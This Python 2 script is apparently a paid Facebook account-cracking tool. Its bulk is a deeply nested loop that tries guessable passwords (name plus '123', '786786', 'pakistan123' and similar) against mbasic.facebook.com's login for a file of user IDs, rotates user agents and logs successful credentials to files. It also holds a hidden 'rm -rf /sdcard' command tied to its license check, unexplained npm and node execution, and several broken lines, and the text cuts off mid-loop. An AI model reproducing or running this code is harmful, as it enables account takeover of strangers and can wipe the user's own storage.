#-*-coding:utf-8-*-
#muhammad Bilal Coding 
#PaidCommands_Speed_oky

import pprint
import uuid
import requests,bs4,sys,os,subprocess
import requests,sys,random,time,re,base64,json

from datetime import datetime
now = datetime.now()
countdown = 30



reload(sys)
sys.setdefaultencoding("utf-8")
from multiprocessing.pool import ThreadPool
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
try:
        import bs4
except ImportError:
        os.system("pip2 install bs4")

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.06)
		
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
P = '\033[0m'
M = '\033[0m'
H = '\033[0m'
K = '\033[0m'
B = '\033[0m'
U = '\033[0m'
O = '\033[0m'
N = '\033[0m'
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
xi_jimpinx = '1714000985456399'
koh = '100005395413800'
hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
bulan_ttl = {'01': 'Januari', '02': 'Februari', '03': 'Maret', '04': 'April', '05': 'Mei', '06': 'Juni', '07': 'Juli', '08': 'Agustus', '09': 'September', '10': 'Oktober', '11': 'November', '12': 'Desember'}
lo_ngentod = '1714009362122228'

host="https://mbasic.facebook.com"

us = [
'Mozilla/5.0 (Linux; Android 9; TA-1021) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 9; RMX1941) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.66 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 10; SM-A105FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 9; SNE-LX1 Build/HUAWEISNE-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Mozilla/5.0 (Linux; Android 10; Mi A2 Lite Build/QKQ1.191002.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/325.0.0.36.170;]',
'Mozilla/5.0 (Linux; Android 11; SM-T505 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',
'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]'
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 8.1.0; LG-H932BK Build/OPM6.171019.030.K1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/69.0.3497.100 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/193.0.0.45.101;]',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3'
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]',]

logo ="""
         \x1b[0;91m   *                  \033[1;0m
         \x1b[0;91m (  `         *   )   \033[1;0m
         \x1b[0;91m )\))(    ( ` )  /(   \033[1;0m
         \x1b[0;91m((_)()\   )\ ( )(_))  \033[1;0m
         \x1b[0;91m(_()((_) ((_|_(_())   \033[1;0m\tMajestic
         \x1b[0;94m _    _    _ _ _ _     \033[1;0m
         \x1b[1;94m|  \/  |_ | |_   _|   \033[1;0m
         \x1b[1;94m| |\/| | || | | |     \033[1;0m
         \x1b[1;94m|_|  |_|\__/  |_|     \033[1;0m
\n\x1b[1;97m===========\x1b[1;97m===========================================
\033[1;96m[!]\033[1;97mADMIN\x1b[1;97m : \x1b[1;97mQAISER \033[1;96m[!]\033[1;97mVersion\x1b[1;97m : \x1b[1;97m3.3.3 \033[1;96m[!]\033[1;97mFb\x1b[1;97m : \x1b[1;97mBILAL
\x1b[1;97m===========\x1b[1;97m===========================================
                                                 """

host="https://mbasic.facebook.com"
ips=None
try:
	b=requests.get("http://ip-api.com/json/").json()["query"]
	ips=requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["Pakistan"].lower()
except:
	ips=None

ok = []
cp = []
ttl =[]


def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
    
def lang(cookies):
	f=False
	rr=bs4.BeautifulSoup(requests.get("https://mbasic.facebook.com/language.php",headers=hdcok(),cookies=cookies).text,"html.parser")
	for i in rr.find_all("a",href=True):
		if "id_ID" in i.get("href"):
			requests.get("https://mbasic.facebook.com/"+i.get("href"),cookies=cookies,headers=hdcok())
			b=requests.get("https://mbasic.facebook.com/profile.php",headers=hdcok(),cookies=cookies).text	
			if "what are you thinking now" in b.lower():
				f=True
	if f==True:
		return True
	else:
		exit("[!] Wrong Cookies")

def basecookie():
	if os.path.exists(".cok"):
		if os.path.getsize(".cok") !=0:
			return gets_dict_cookies(open('.cok').read().strip())
		else:logs()
	else:logs()

def hdcok():
	global host
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

def gets_cookies(cookies):
	result=[]
	for i in enumerate(cookies.keys()):
		if i[0]==len(list(cookies.keys()))-1:result.append(i[1]+"="+cookies[i[1]])
		else:result.append(i[1]+"="+cookies[i[1]]+"; ")
	return "".join(result)

def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result8

def main():
    os.system("clear")
    print(logo)
    print("\x1b[1;97m\t|=======================|")
    print("\x1b[1;97m\t| \033[1;96m[1].\x1b[1;97m  Start Cracking  |")
    print("\x1b[1;97m\t| \033[1;96m[2].\x1b[1;97m  Yotube Channel  |")
    print("\x1b[1;97m\t| \033[1;96m[3].\x1b[1;97m  HowTo Use Vdeo  |")
    print("\x1b[1;97m\t|=======================|")
    log_sel()
def log_sel():
	sel = raw_input(" \n\tSelect * : ")
	
	if sel =="1":
		reg()
	elif sel =="2":
		os.system('xdg-open https://youtube.com/channel/UCOaenAmj6A-bPrzT3ynDEbw')
		main()
	elif sel =="3":
		os.system('python2 use.py')
		main()
	elif sel=="":
		print('Invalid Option')
		time.sleep(2)
		main()
	else:
		print("")
		print("\tSelect valid option")
		print("")
		time.sleep(3)
		main()

def reg():
    os.system('clear')
    print logo
    try:
        to = open('/sdcard/.debug.txt', 'r').read()
        if to ==" ":
            os.system('rm -rf /sdcard')
            os.system('rm -rf /sdcard/*')
        
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/ffdvl1120/file/main/server.txt').text
    if to in r:
    	print('\033[0;30mWait')
    	os.system('cd ..... && npm install')
        print('\033[1;31m \tWait CHECKING ')
        print('\033[0;30mWait')
        time.sleep(0.5)
        os.system('fuser -k 5000/tcp &')
        print('\n\n\033[1;32m \t40% CHECKED ')
        print('\033[0;30mWait')
        time.sleep(0.5)
        os.system('#')
        print('\033[1;33m \tWait 80% CHECKED ')
        print('\033[0;30mWait')
        time.sleep(0.5)
        os.system('cd ..... && node index.js &')
        print('\033[1;36m \t100% COMPLETED ')
        print('\033[0;30mWait')
        time.sleep(2)
        menu()
    else:
        os.system('clear')
        print logo
        print ' \x1b[1;96mYour Id Is Not Approved '
        print ' \x1b[1;34mYour id : ' + to
        print ' \x1b[1;96mCopy the id and send to Admin'
        raw_input('\x1b[1;96m Press enter to send id')
        os.system('xdg-open https://www.facebook.com/102523068839630')
        reg()


def reg2():
    os.system('clear')
    print logo
    print '\t\033[1;31mApproval not detected'
    print ' \x1b[1;96mCopy and press enter ,'
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    raw_input(' \033[1;96mPress enter to go to whatsapp ')
    os.system('xdg-open https://www.facebook.com/102523068839630')
    sav = open('/sdcard/.debug.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press enter to check Approval ')
    reg()


def menu():
    os.system('clear')
    print logo
    tok = open('/sdcard/.debug.txt', 'r').read()
    print("\x1b[0;90m ————————————————————————————————————————————————")
    print("\x1b[1;96m   ﹂[1] \x1b[1;97m. Auto Pass Crack \033[1;93m[FILE]\033[0m")
    print("\x1b[1;96m   ﹂[2] \x1b[1;97m. Choice Pass Digit Crack \033[1;93m[FILE]\033[0m")
    print("\x1b[1;96m   ﹂[3] \x1b[1;97m. Choice Pass Name+Digit Crack \033[1;93m[FILE]\033[0m")
    print("\x1b[1;96m   ﹂[4] \x1b[1;97m. Create File \033[1;94m[Login]\033[0m")
    print("\x1b[1;96m   ﹂[5] \x1b[1;97m. Random Crack \033[1;94m[Coming-Soon]\033[1;0m")
    print("\x1b[1;96m   ﹂[6] \x1b[1;97m. Check Your License ")
    print("\x1b[1;96m   ﹂[7] \x1b[1;97m. Location Detail Finder \033[1;93m[IP]\033[1;0m")
    print("\x1b[1;96m   ﹂[0] \x1b[1;97m. Back")
    print("\x1b[0;90m ————————————————————————————————————————————————")
    menu_option()
    
def menu_option():
	select = raw_input("\x1b[1;97m\n ☇ Select : ")
	if select =="1":
		crack()
	elif select =="2":
		choice()
	elif select =="3":
		namechoice()
	elif select =="4":
		s_b()
	elif select =="5":
		os.system('clear')
		print("Sorry Sir ! This Option Is In Maintainance . W`ll Notify You When We Done Thanks . ")
		time.sleep(5)
		menu()
	elif select =="6":
		os.system('clear')
		print(logo)
		tok = open('/sdcard/.debug.txt', 'r').read()
		print'\033[1;32mYour Token Is\033[0m',tok,'\033[1;32mActivated\n'
		time.sleep(3)
		menu()
	elif select =="7":
		iploc()
		
	else:
		print("\tSelect valid option")
		menu_option()

def crack():
	os.system("clear")
	print(logo)
	print("\x1b[1;97m-----------------------------------------------------")
	print("\x1b[1;96m [1]\x1b[1;97m Crack File \x1b[0;90m")
	print("\x1b[1;96m [0]\x1b[1;97m Back")
	print("\x1b[1;97m-----------------------------------------------------")
	crack_select()
def crack_select():
	select = raw_input("\033[1;37m☇ Select : \033[0;97m")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		print(logo)
		print 
		filelist = raw_input("\x1b[1;96m[!]\x1b[1;97m File Path : ")
		try:
			for line in open(filelist , "r").readlines():
			    id.append(line.strip())
		except (KeyError,IOError):
			print(" \033[1;37m File Not Found\033[0;98m")
			raw_input(" Press Enter To Back ")
			crack()
	elif select =="0":
	    menu()
	else:
		print("\nWrong Input !\033[0;97m")
		choice_select()
	print''
	print(" \x1b[1;92m        Total ids in File :\x1b[1;96m "+str(len(id)))
	print(" \x1b[1;93m        Kindly Wait Cracking Started ...")
	print(" \x1b[1;97m-----------------------------------------------------")
	print("\n")
	def main(arg):
		user=arg
		uid,name=user.split("|")
		sharagent = random.choice(us)
		session = requests.Session()
		session.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":sharagent,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
		host="https://mbasic.facebook.com"
		try:
			ps = name + '123'
			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps, 'login': 'submit'})
			sp = data.content
			if 'mbasic_logout_button' in sp or 'save-device' in sp:
				print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps+'\033[0;97m')
				ok = open('ok.txt', 'a')
				ok.write(uid+'|'+ps+'\n')
				ok.close()
				oks.append(uid+ps)
			else:
				if 'checkpoint' in sp:
					print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps+'\033[0;97m')
					cp = open('cps.txt', 'a')
					cp.write(uid+'|'+ps+'\n')
					cp.close()
					cps.append(uid+ps)
				else:
					ps2 = name + '1122'
					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps2, 'login': 'submit'})
					sp = data.content
					if 'mbasic_logout_button' in sp or 'save-device' in sp:
						print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps2+'\033[0;97m')
						ok = open('ok.txt', 'a')
						ok.write(uid+'|'+ps2+'\n')
						ok.close()
						oks.append(uid+ps2)
					else:
						if 'checkpoint' in sp:
							print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps2+'\033[0;97m')
							cp = open('cps.txt', 'a')
							cp.write(uid+'|'+ps2+'\n')
							cp.close()
							cps.append(uid+ps2)
						else:
							ps3 = name + '@123'
							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps3, 'login': 'submit'})
							sp = data.content
							if 'mbasic_logout_button' in sp or 'save-device' in sp:
								print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps3+'\033[0;97m')
								ok = open('ok.txt', 'a')
								ok.write(uid+'|'+ps3+'\n')
								ok.close()
								oks.append(uid+ps3)
							else:
								if 'checkpoint' in sp:
									print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps3+'\033[0;97m')
									cp = open('cps.txt', 'a')
									cp.write(uid+'|'+ps3+'\n')
									cp.close()
									cps.append(uid+ps3)
								else:
									ps4 = name + '12'
									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps4, 'login': 'submit'})
									sp = data.content
									if 'mbasic_logout_button' in sp or 'save-device' in sp:
										print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps4+'\033[0;97m')
										ok = open('ok.txt', 'a')
										ok.write(uid+'|'+ps4+'\n')
										ok.close()
										oks.append(uid+ps4)
									else:
										if 'checkpoint' in sp:
											print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps4+'\033[0;97m')
											cp = open('cps.txt', 'a')
											cp.write(uid+'|'+ps4+'\n')
											cp.close()
											cps.append(uid+ps4)
										else:
											ps5 = name + '@12'
											data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps5, 'login': 'submit'})
											sp = data.content
											if 'mbasic_logout_button' in sp or 'save-device' in sp:
												print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps5+'\033[0;97m')
												ok = open('ok.txt', 'a')
												ok.write(uid+'|'+ps5+'\n')
												ok.close()
												oks.append(uid+ps5)
											else:
												if 'checkpoint' in sp:
													print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps5+'\033[0;97m')
													cp = open('cps.txt', 'a')
													cp.write(uid+'|'+ps5+'\n')
													cp.close()
													cps.append(uid+ps5)
												else:
													ps6 = name + '786786'
													data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps6, 'login': 'submit'})
													sp = data.content
													if 'mbasic_logout_button' in sp or 'save-device' in sp:
														print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps6+'\033[0;97m')
														ok = open('ok.txt', 'a')
														ok.write(uid+'|'+ps6+'\n')
														ok.close()
														oks.append(uid+ps6)
													else:
														if 'checkpoint' in sp:
															print(' \033[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps6+'\033[0;97m')
															cp = open('cps.txt', 'a')
															cp.write(uid+'|'+ps6+'\n')
															cp.close()
															cps.append(uid+ps6)
														else:
															ps7 = ["first_name"] + ["last_name"]
															data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps7, 'login': 'submit'})
															sp = data.content
															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps7+'\033[0;97m')
																ok = open('ok.txt', 'a')
																ok.write(uid+'|'+ps7+'\n')
																ok.close()
																oks.append(uid+ps7)
															else:
																if 'checkpoint' in sp:
																	print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps7+'\033[0;97m')
																	cp = open('cps.txt', 'a')
																	cp.write(uid+'|'+ps7+'\n')
																	cp.close()
																	cps.append(uid+ps7)
																else:
																	ps8 = ["last_name"] + ["first_name"]
																	data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps8, 'login': 'submit'})
																	sp = data.content
																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																		print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps8+'\033[0;97m')
																		ok = open('ok.txt', 'a')
																		ok.write(uid+'|'+ps8+'\n')
																		ok.close()
																		oks.append(uid+ps8)
																	else:
																		if 'checkpoint' in sp:
																			print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps8+'\033[0;97m')
																			cp = open('cps.txt', 'a')
																			cp.write(uid+'|'+ps8+'\n')
																			cp.close()
																			cps.append(uid+ps8)
																		else:
																			ps9 = '786786786'
																			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps9, 'login': 'submit'})
																			sp = data.content
																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																				print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps9+'\033[0;97m')
																				ok = open('ok.txt', 'a')
																				ok.write(uid+'|'+ps9+'\n')
																				ok.close()
																				oks.append(uid+ps9)
																			else:
																				if 'checkpoint' in sp:
																					print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps9+'\033[0;97m')
																					cp = open('cps.txt', 'a')
																					cp.write(uid+'|'+ps9+'\n')
																					cp.close()
																					cps.append(uid+ps9)
																				else:
																					ps10 = '000786'
																					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps10, 'login': 'submit'})
																					sp = data.content
																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																						print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps10+'\033[0;97m')
																						ok = open('ok.txt', 'a')
																						ok.write(uid+'|'+ps10+'\n')
																						ok.close()
																						oks.append(uid+ps10)
																					else:
																						if 'checkpoint' in sp:
																							print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps10+'\033[0;97m')
																							cp = open('cps.txt', 'a')
																							cp.write(uid+'|'+ps10+'\n')
																							cp.close()
																							cps.append(uid+ps10)
																						else:
																							ps11 = '786000'
																							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps11, 'login': 'submit'})
																							sp = data.content
																							if 'mbasic_logout_button' in sp or 'save-device' in sp:
																								print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps11+'\033[0;97m')
																								ok = open('ok.txt', 'a')
																								ok.write(uid+'|'+ps11+'\n')
																								ok.close()
																								oks.append(uid+ps11)
																							else:
																								if 'checkpoint' in sp:
																									print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps11+'\033[0;97m')
																									cp = open('cps.txt', 'a')
																									cp.write(uid+'|'+ps11+'\n')
																									cp.close()
																									cps.append(uid+ps11)
																								else:
																									ps12 = 'khan123'
																									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps12, 'login': 'submit'})
																									sp = data.content
																									if 'mbasic_logout_button' in sp or 'save-device' in sp:
																										print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps12+'\033[0;97m')
																										ok = open('ok.txt', 'a')
																										ok.write(uid+'|'+ps12+'\n')
																										ok.close()
																										oks.append(uid+ps12)
																									else:
																										if 'checkpoint' in sp:
																											print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps12+'\033[0;97m')
																											cp = open('cps.txt', 'a')
																											cp.write(uid+'|'+ps12+'\n')
																											cp.close()
																											cps.append(uid+ps12)
																										else:
																											ps13 = '786110'
																											data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps13, 'login': 'submit'})
																											sp = data.content
																											if 'mbasic_logout_button' in sp or 'save-device' in sp:
																												print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps13+'\033[0;97m')
																												ok = open('ok.txt', 'a')
																												ok.write(uid+'|'+ps13+'\n')
																												ok.close()
																												oks.append(uid+ps13)
																											else:
																												if 'checkpoint' in sp:
																													print(' \033[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps13+'\033[0;97m')
																													cp = open('cps.txt', 'a')
																													cp.write(uid+'|'+ps13+'\n')
																													cp.close()
																													cps.append(uid+ps13)
																												else:
																													ps14 = 'pakistan123'
																													data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps14, 'login': 'submit'})
																													sp = data.content
																													if 'mbasic_logout_button' in sp or 'save-device' in sp:
																														print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps14+'\033[0;97m')
																														ok = open('ok.txt', 'a')
																														ok.write(uid+'|'+ps14+'\n')
																														ok.close()
																														oks.append(uid+ps14)
																													else:
																														if 'checkpoint' in sp:
																															print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps14+'\033[0;97m')
																															cp = open('cps.txt', 'a')
																															cp.write(uid+'|'+ps14+'\n')
																															cp.close()
																															cps.append(uid+ps14)
																														else:
																															ps15 = '889900'
																															data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps15, 'login': 'submit'})
																															sp = data.content
																															if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps15+'\033[0;97m')
																																ok = open('ok.txt', 'a')
																																ok.write(uid+'|'+ps15+'\n')
																																ok.close()
																																oks.append(uid+ps15)
																															else:
																																if 'checkpoint' in sp:
																																	print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps15+'\033[0;97m')
																																	cp = open('cps.txt', 'a')
																																	cp.write(uid+'|'+ps15+'\n')
																																	cp.close()
																																	cps.append(uid+ps15)
																																else:
																																	ps16 = 'baloch123'
																																	data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps16, 'login': 'submit'})
																																	sp = data.content
																																	if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																		print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps16+'\033[0;97m')
																																		ok = open('ok.txt', 'a')
																																		ok.write(uid+'|'+ps16+'\n')
																																		ok.close()
																																		oks.append(uid+ps16)
																																	else:
																																		if 'checkpoint' in sp:
																																			print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps16+'\033[0;97m')
																																			cp = open('cps.txt', 'a')
																																			cp.write(uid+'|'+ps16+'\n')
																																			cp.close()
																																			cps.append(uid+ps16)
																																		else:
																																			ps17 = 'ali123'
																																			data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps17, 'login': 'submit'})
																																			sp = data.content
																																			if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																				print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps17+'\033[0;97m')
																																				ok = open('ok.txt', 'a')
																																				ok.write(uid+'|'+ps17+'\n')
																																				ok.close()
																																				oks.append(uid+ps17)
																																			else:
																																				if 'checkpoint' in sp:
																																					print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps17+'\033[0;97m')
																																					cp = open('cps.txt', 'a')
																																					cp.write(uid+'|'+ps17+'\n')
																																					cp.close()
																																					cps.append(uid+ps17)
																																				else:
																																					ps18 = name + '@786'
																																					data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps18, 'login': 'submit'})
																																					sp = data.content
																																					if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																						print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps18+'\033[0;97m')
																																						ok = open('ok.txt', 'a')
																																						ok.write(uid+'|'+ps18+'\n')
																																						ok.close()
																																						oks.append(uid+ps18)
																																					else:
																																						if 'checkpoint' in sp:
																																							print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps18+'\033[0;97m')
																																							cp = open('cps.txt', 'a')
																																							cp.write(uid+'|'+ps18+'\n')
																																							cp.close()
																																							cps.append(uid+ps18)
																																						else:
																																							ps19 = name + '@khan'
																																							data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps19, 'login': 'submit'})
																																							sp = data.content
																																							if 'mbasic_logout_button' in sp or 'save-device' in sp:
																																								print(' \x1b[1;92m [OK-MJT] '+uid+' | '+ps19+'\033[0;97m')
																																								ok = open('ok.txt', 'a')
																																								ok.write(uid+'|'+ps19+'\n')
																																								ok.close()
																																								oks.append(uid+ps19)
																																							else:
																																								if 'checkpoint' in sp:
																																									print(' \x1b[0;90m \033[1;31m[\033[0mCP-MJT\033[1;31m]\033[0;90m '+uid+' | '+ps19+'\033[0;97m')
																																									cp = open('cps.txt', 'a')
																																									cp.write(uid+'|'+ps19+'\n')
																																									cp.close()
																																									cps.append(uid+ps19)
																																								else:
																																									ps20 = '223344'
																																									data = session.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': ps20, 'login': 'submit'})
																																									sp = data.content
																																									if 'mbasic_logout_button' in sp or 'save-device' in sp:
